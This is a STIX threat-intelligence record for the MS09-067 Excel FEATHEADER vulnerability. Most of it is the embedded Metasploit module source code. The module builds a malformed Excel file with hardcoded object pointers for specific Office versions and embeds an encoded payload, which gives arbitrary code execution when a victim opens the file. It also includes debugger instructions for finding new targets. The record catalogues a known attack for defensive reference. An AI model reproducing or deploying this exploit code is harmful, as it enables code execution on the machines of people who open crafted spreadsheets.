{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--49fca9e4-e6bb-493a-b64e-16683a4f9a7d",
    "created": "2024-08-14T16:36:43.829482Z",
    "modified": "2024-08-14T16:36:43.829485Z",
    "name": "MS09-067 Microsoft Excel Malformed FEATHEADER Record Vulnerability",
    "description": " This module exploits a vulnerability in the handling of the FEATHEADER record by Microsoft Excel. Revisions of Office XP and later prior to the release of the MS09-067 bulletin are vulnerable.  When processing a FEATHEADER (Shared Feature) record, Microsoft used a data structure from the file to calculate a pointer offset without doing proper validation. Attacker supplied data is then used to calculate the location of an object, and in turn a virtual function call. This results in arbitrary code execution.  NOTE: On some versions of Office, the user will need to dismiss a warning dialog prior to the payload executing.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ms09_067_excel_featheader.rb",
            "external_id": "ms09_067_excel_featheader.rb"
        },
        {
            "source_name": "reference",
            "url": "http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=832"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/ole'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS09-067 Microsoft Excel Malformed FEATHEADER Record Vulnerability',\n      'Description'    => %q{\n            This module exploits a vulnerability in the handling of the FEATHEADER record\n          by Microsoft Excel. Revisions of Office XP and later prior to the release of the\n          MS09-067 bulletin are vulnerable.\n\n          When processing a FEATHEADER (Shared Feature) record, Microsoft used a data\n          structure from the file to calculate a pointer offset without doing proper\n          validation. Attacker supplied data is then used to calculate the location of an\n          object, and in turn a virtual function call. This results in arbitrary code\n          execution.\n\n          NOTE: On some versions of Office, the user will need to dismiss a warning dialog\n          prior to the payload executing.\n        },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Sean Larsson',  # original discovery\n          'jduck'\n        ],\n      'References'     =>\n        [\n          [ 'CVE','2009-3129' ],\n          [ 'OSVDB', '59860' ],\n          [ 'MSB', 'MS09-067' ],\n          [ 'BID', '36945' ],\n          [ 'ZDI', '09-083' ],\n          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=832' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n          'DisableNops'   => true # no need\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          #\n          # To find new targets, generate the file using the debug target and execute\n          # the following in windbg:\n          #\n          # 0:000> s -b 0 L?-1 04 00 00 00 ee ff c0 da\n          #\n          # Use the largest number + 9 (should be in the 0x30xxxxxx range)\n          #\n\n          # Office v10.6501.6626, excel.exe v10.0.6501.0\n          [ 'Microsoft Office 2002 (XP) SP3 base English on Windows XP SP3 English',\n            { 'ObjPtr' => 0x307ddd10 }\n          ],\n\n          # Office v10.6854.6845, excel.exe v10.0.6854.0\n          [ 'Microsoft Office 2002 (XP) SP3 w/kb969680 English on Windows XP SP3 English',\n            { 'ObjPtr' => 0x308082d0 }\n          ],\n\n          # Office v11.5612.5606, excel.exe v11.0.5612.0\n          [ 'Microsoft Office 2003 SP0 English on Windows XP SP3 English',\n            { 'ObjPtr' => 0x3085d430 }\n          ],\n\n          # Office v12.0.6425.1000, excel.exe v12.0.6425.1000\n          [ 'Microsoft Office 2007 SP2 English on Windows XP SP3 English',\n            { 'ObjPtr' => 0x30f69018 }\n          ],\n\n          # crash on a deref path to heaven.\n          [ 'Crash Target for Debugging',\n            { 'ObjPtr' => 0xdac0ffee }\n          ]\n        ],\n      'DisclosureDate' => '2009-11-10'))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.xls']),\n        OptString.new('OUTPUTPATH', [ true, 'The output path to use.', Msf::Config.local_directory]),\n      ])\n  end\n\n  def add_record(tag, data=nil)\n    ret = \"\"\n    ret << Rex::OLE::Util.pack16(tag)\n    data ||= ''\n    ret << Rex::OLE::Util.pack16(data.length)\n    ret << data\n    ret\n  end\n\n  def exploit\n\n    # build the Workbook stream\n    ptr1 = target['ObjPtr']\n    ptr2 = ptr1 + 4\n    ptr3 = ptr2 + 4\n    ptr4 = ptr3 + 4\n\n    bofdata = \"\"\n    bofdata << Rex::OLE::Util.pack16(0x0600)\n    bofdata << Rex::OLE::Util.pack16(0x0005)\n    bofdata << Rex::OLE::Util.pack16(0x1faa)\n    bofdata << Rex::OLE::Util.pack16(0x07cd)\n    bofdata << Rex::OLE::Util.pack32(0x000100c1)\n    bofdata << Rex::OLE::Util.pack32(0x00000406)\n\n    feathdr = \"\"\n    feathdr << Rex::OLE::Util.pack16(0x0867) # frt\n    feathdr << \"\\x00\" * (10)\n    feathdr << Rex::OLE::Util.pack16(0x0004) # isf\n    feathdr << \"\\x01\" # reserved\n    feathdr << Rex::OLE::Util.pack32(0x00000004) # cbHdrData\n    feathdr << [ptr1].pack('V')\n    feathdr << rand_text_alphanumeric(1) # alignment\n    feathdr << [ptr2].pack('V')\n    feathdr << [ptr3 - 0x28].pack('V')\n    feathdr << [ptr4].pack('V')\n    #feathdr << \"\\xcc\"\n    feathdr << payload.encoded\n\n    content = \"\"\n    content << add_record(0x0809, bofdata)\n    content << add_record(0x0867, feathdr)\n    content << add_record(0x000a)\n\n    print_status(\"Creating Excel spreadsheet ...\")\n\n    out = File.join(File.join(datastore['OUTPUTPATH'], datastore['FILENAME']))\n    stg = Rex::OLE::Storage.new(out, Rex::OLE::STGM_WRITE)\n    if (not stg)\n      fail_with(Failure::Unknown, 'Unable to create output file')\n    end\n    stm = stg.create_stream(\"Workbook\")\n    if (not stm)\n      fail_with(Failure::Unknown, 'Unable to create workbook stream')\n    end\n    stm << content\n    stm.close\n    stg.close\n\n    print_status(\"Generated output file #{out}\")\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-11-10",
    "x_mitre_platforms": [
        "win'"
    ]
}